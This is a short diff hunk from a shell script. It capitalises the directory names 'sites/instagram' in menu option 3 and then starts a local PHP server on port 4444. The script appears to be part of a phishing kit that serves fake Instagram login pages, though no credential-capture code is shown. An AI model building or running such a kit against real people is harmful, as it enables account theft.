@@ -88,8 +88,8 @@ echo ""
 
                 ;;
 
-                3) cd sites/
-                  cd instagram/
+                3) cd Sites/
+                  cd Instagram/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
